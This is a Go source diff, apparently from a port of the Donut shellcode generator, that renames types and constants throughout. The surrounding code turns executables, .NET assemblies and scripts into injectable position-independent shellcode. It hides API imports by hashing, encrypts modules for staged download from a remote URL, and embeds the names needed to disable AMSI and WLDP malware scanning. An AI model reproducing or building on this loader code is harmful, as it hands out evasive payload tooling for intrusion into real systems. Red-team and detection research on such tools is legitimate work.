@@ -20,7 +20,7 @@ import (
 */
 
 // ShellcodeFromURL - Downloads a PE from URL, makes shellcode
-func ShellcodeFromURL(fileURL string, config *DonutConfig) (*bytes.Buffer, error) {
+func ShellcodeFromURL(fileURL string, config *Config) (*bytes.Buffer, error) {
 	buf, err := DownloadFile(fileURL)
 	if err != nil {
 		return nil, err
@@ -29,7 +29,7 @@ func ShellcodeFromURL(fileURL string, config *DonutConfig) (*bytes.Buffer, error
 }
 
 // ShellcodeFromFile - Loads PE from file, makes shellcode
-func ShellcodeFromFile(filename string, config *DonutConfig) (*bytes.Buffer, error) {
+func ShellcodeFromFile(filename string, config *Config) (*bytes.Buffer, error) {
 
 	b, err := ioutil.ReadFile(filename)
 	if err != nil {
@@ -38,28 +38,28 @@ func ShellcodeFromFile(filename string, config *DonutConfig) (*bytes.Buffer, err
 	switch strings.ToLower(filepath.Ext(filename)) {
 	case ".exe":
 		if config.DotNetMode {
-			config.Type = DONUT_MODULE_NET_EXE
+			config.Type = ModuleNETEXE
 		} else {
-			config.Type = DONUT_MODULE_EXE
+			config.Type = ModuleEXE
 		}
 	case ".dll":
 		if config.DotNetMode {
-			config.Type = DONUT_MODULE_NET_DLL
+			config.Type = ModuleNETDLL
 		} else {
-			config.Type = DONUT_MODULE_DLL
+			config.Type = ModuleDLL
 		}
 	case ".xsl":
-		config.Type = DONUT_MODULE_XSL
+		config.Type = ModuleXSL
 	case ".js":
-		config.Type = DONUT_MODULE_JS
+		config.Type = ModuleJS
 	case ".vbs":
-		config.Type = DONUT_MODULE_VBS
+		config.Type = ModuleVBS
 	}
 	return ShellcodeFromBytes(bytes.NewBuffer(b), config)
 }
 
 // ShellcodeFromBytes - Passed a PE as byte array, makes shellcode
-func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, error) {
+func ShellcodeFromBytes(buf *bytes.Buffer, config *Config) (*bytes.Buffer, error) {
 
 	if err := CreateModule(config, buf); err != nil {
 		return nil, err
@@ -69,7 +69,7 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, 
 		return nil, err
 	}
 	// If the module will be stored on a remote server
-	if config.InstType == DONUT_INSTANCE_URL {
+	if config.InstType == InstanceURL {
 		log.Printf("Saving %s to disk.\n", config.ModuleName)
 		// save the module to disk using random name
 		instance.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0})          // mystery padding
@@ -82,7 +82,7 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, 
 
 // Sandwich - adds the donut prefix in the beginning (stomps DOS header),
 // then payload, then donut stub at the end
-func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
+func Sandwich(arch Arch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 	/*
 			Disassembly:
 					   0:  e8 					call $+
@@ -139,16 +139,16 @@ func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 }
 
 // CreateModule - Creates the Donut Module from Config
-func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
+func CreateModule(config *Config, inputFile *bytes.Buffer) error {
 
-	mod := new(DonutModule)
+	mod := new(Module)
 	mod.ModType = uint32(config.Type)
 	mod.Thread = uint32(config.Thread)
 	mod.Unicode = uint32(config.Unicode)
 	mod.Compress = uint32(config.Compress)
 
-	if config.Type == DONUT_MODULE_NET_DLL ||
-		config.Type == DONUT_MODULE_NET_EXE {
+	if config.Type == ModuleNETDLL ||
+		config.Type == ModuleNETEXE {
 		// If no domain name specified, generate a random one
 		if config.Domain == "" && config.Entropy != EntropyNone {
 			config.Domain = RandomString(domainLen)
@@ -157,7 +157,7 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 		}
 		copy(mod.Domain[:], []byte(config.Domain)[:])
 
-		if config.Type == DONUT_MODULE_NET_DLL {
+		if config.Type == ModuleNETDLL {
 			log.Println("Class:", config.Class)
 			copy(mod.Cls[:], []byte(config.Class)[:])
 			log.Println("Method:", config.Method)
@@ -169,18 +169,18 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 		}
 		log.Println("Runtime:", config.Runtime)
 		copy(mod.Runtime[:], []byte(config.Runtime)[:])
-	} else if config.Type == DONUT_MODULE_DLL && config.Method != "" {
+	} else if config.Type == ModuleDLL && config.Method != "" {
 		// Unmanaged DLL? check for exported api
 		log.Println("DLL function:", config.Method)
 		copy(mod.Method[:], []byte(config.Method))
 	}
-	mod.Zlen = 0
+	mod.ZLen = 0
 	mod.Len = uint32(inputFile.Len())
 
 	if config.Parameters != "" {
 		skip := false
 		// if type is unmanaged EXE
-		if config.Type == DONUT_MODULE_EXE {
+		if config.Type == ModuleEXE {
 			// and entropy is enabled
 			if config.Entropy != EntropyNone {
 				// generate random name
@@ -209,16 +209,16 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 }
 
 // CreateInstance - Creates the Donut Instance from Config
-func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
+func CreateInstance(config *Config) (*bytes.Buffer, error) {
 
-	inst := new(DonutInstance)
+	inst := new(Instance)
 	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
 	instLen := uint32(3312 + 352 + 8)
 	inst.Bypass = uint32(config.Bypass)
 
 	// if this is a PIC instance, add the size of module
 	// that will be appended to the end of structure
-	if config.InstType == DONUT_INSTANCE_PIC {
+	if config.InstType == InstancePIC {
 		log.Printf("The size of module is %v bytes. Adding to size of instance.\n", modLen)
 		instLen += modLen
 	}
@@ -265,7 +265,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	}
 	log.Println("Generating hashes for API using IV:", inst.Iv)
 
-	for cnt, c := range api_imports {
+	for cnt, c := range apiImports {
 		// calculate hash for DLL string
 		dllHash := Maru([]byte(c.Module), inst.Iv)
 
@@ -279,53 +279,53 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 			inst.Hash[cnt])
 	}
 	// save how many API to resolve
-	inst.ApiCount = uint32(len(api_imports))
+	inst.ApiCount = uint32(len(apiImports))
 	copy(inst.DllNames[:], "ole32;oleaut32;wininet;mscoree;shell32")
 
 	// if module is .NET assembly
-	if config.Type == DONUT_MODULE_NET_DLL ||
-		config.Type == DONUT_MODULE_NET_EXE {
+	if config.Type == ModuleNETDLL ||
+		config.Type == ModuleNETEXE {
 		log.Println("Copying GUID structures and DLL strings for loading .NET assemblies")
-		copy(inst.XIID_AppDomain[:], xIID_AppDomain[:])
-		copy(inst.XIID_ICLRMetaHost[:], xIID_ICLRMetaHost[:])
-		copy(inst.XCLSID_CLRMetaHost[:], xCLSID_CLRMetaHost[:])
-		copy(inst.XIID_ICLRRuntimeInfo[:], xIID_ICLRRuntimeInfo[:])
-		copy(inst.XIID_ICorRuntimeHost[:], xIID_ICorRuntimeHost[:])
-		copy(inst.XCLSID_CorRuntimeHost[:], xCLSID_CorRuntimeHost[:])
-	} else if config.Type == DONUT_MODULE_VBS ||
-		config.Type == DONUT_MODULE_JS {
+		copy(inst.XIIDAppDomain[:], xIIDAppDomain[:])
+		copy(inst.XIIDICLRMetaHost[:], xIIDICLRMetaHost[:])
+		copy(inst.XCLSIDCLRMetaHost[:], xCLSIDCLRMetaHost[:])
+		copy(inst.XIIDICLRRuntimeInfo[:], xIIDICLRRuntimeInfo[:])
+		copy(inst.XIIDICorRuntimeHost[:], xIIDICorRuntimeHost[:])
+		copy(inst.XCLSIDCorRuntimeHost[:], xCLSIDCorRuntimeHost[:])
+	} else if config.Type == ModuleVBS ||
+		config.Type == ModuleJS {
 		log.Println("Copying GUID structures and DLL strings for loading VBS/JS")
 
-		copy(inst.XIID_IUnknown[:], xIID_IUnknown[:])
-		copy(inst.XIID_IDispatch[:], xIID_IDispatch[:])
-		copy(inst.XIID_IHost[:], xIID_IHost[:])
-		copy(inst.XIID_IActiveScript[:], xIID_IActiveScript[:])
-		copy(inst.XIID_IActiveScriptSite[:], xIID_IActiveScriptSite[:])
-		copy(inst.XIID_IActiveScriptSiteWindow[:], xIID_IActiveScriptSiteWindow[:])
-		copy(inst.XIID_IActiveScriptParse32[:], xIID_IActiveScriptParse32[:])
-		copy(inst.XIID_IActiveScriptParse64[:], xIID_IActiveScriptParse64[:])
+		copy(inst.XIIDIUnknown[:], xIIDIUnknown[:])
+		copy(inst.XIIDIDispatch[:], xIIDIDispatch[:])
+		copy(inst.XIIDIHost[:], xIIDIHost[:])
+		copy(inst.XIIDIActiveScript[:], xIIDIActiveScript[:])
+		copy(inst.XIIDIActiveScriptSite[:], xIIDIActiveScriptSite[:])
+		copy(inst.XIIDIActiveScriptSiteWindow[:], xIIDIActiveScriptSiteWindow[:])
+		copy(inst.XIIDIActiveScriptParse32[:], xIIDIActiveScriptParse32[:])
+		copy(inst.XIIDIActiveScriptParse64[:], xIIDIActiveScriptParse64[:])
 
-		copy(inst.Wscript[:], "WScript")
-		copy(inst.Wscript_exe[:], "wscript.exe")
+		copy(inst.WScript[:], "WScript")
+		copy(inst.WScriptEXE[:], "wscript.exe")
 
-		if config.Type == DONUT_MODULE_VBS {
-			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_VBScript[:])
+		if config.Type == ModuleVBS {
+			copy(inst.XCLSIDScriptLanguage[:], xCLSIDVBScript[:])
 		} else {
-			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_JScript[:])
+			copy(inst.XCLSIDScriptLanguage[:], xCLSIDJScript[:])
 		}
 	}
 
 	// required to disable AMSI
 	copy(inst.Clr[:], "clr")
-	copy(inst.Amsi[:], "amsi")
+	copy(inst.AMSI[:], "amsi")
 	copy(inst.AmsiInit[:], "AmsiInitialize")
 	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
 	copy(inst.AmsiScanStr[:], "AmsiScanString")
 
 	// stuff for PE loader
 	if len(config.Parameters) > 0 {
-		copy(inst.Dataname[:], ".data")
-		copy(inst.Kernelbase[:], "kernelbase")
+		copy(inst.DataName[:], ".data")
+		copy(inst.KernelBase[:], "kernelbase")
 
 		copy(inst.CmdSyms[:],
 			"_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv")
@@ -334,7 +334,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		copy(inst.ExitApi[:], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit")
 	}
 	// required to disable WLDP
-	copy(inst.Wldp[:], "wldp")
+	copy(inst.WLDP[:], "wldp")
 	copy(inst.WldpQuery[:], "WldpQueryDynamicCodeTrust")
 	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")
 
@@ -350,7 +350,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 
 	// if the module will be downloaded
 	// set the URL parameter and request verb
-	if inst.Type == DONUT_INSTANCE_URL {
+	if inst.Type == InstanceURL {
 		if config.ModuleName != "" {
 			if config.Entropy != EntropyNone {
 				// generate a random name for module
@@ -369,12 +369,12 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		log.Println("Payload will attempt download from:", string(inst.Url[:]))
 	}
 
-	inst.Mod_len = uint64(modLen) + 8
+	inst.ModuleLen = uint64(modLen) + 8
 	inst.Len = instLen
 	config.inst = inst
 	config.instLen = instLen
 
-	if config.InstType == DONUT_INSTANCE_URL && config.Entropy == EntropyDefault {
+	if config.InstType == InstanceURL && config.Entropy == EntropyDefault {
 		log.Println("encrypting module for download")
 		config.ModuleMac = Maru(inst.Sig[:], inst.Iv)
 		config.ModuleData = bytes.NewBuffer(Encrypt(
@@ -389,7 +389,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		}
 		return b, nil
 	}
-	// else if config.InstType == DONUT_INSTANCE_PIC
+	// else if config.InstType == InstancePIC
 	b := new(bytes.Buffer)
 	inst.WriteTo(b)
 	if _, err := config.ModuleData.WriteTo(b); err != nil {
@@ -427,11 +427,11 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 }
 
 // DefaultConfig - returns a default donut config for x32+64, EXE, native binary
-func DefaultConfig() *DonutConfig {
-	return &DonutConfig{
+func DefaultConfig() *Config {
+	return &Config{
 		Arch:     X84,
-		Type:     DONUT_MODULE_EXE,
-		InstType: DONUT_INSTANCE_PIC,
+		Type:     ModuleEXE,
+		InstType: InstancePIC,
 		Entropy:  EntropyDefault,
 		Compress: 1,
 		Format:   1,
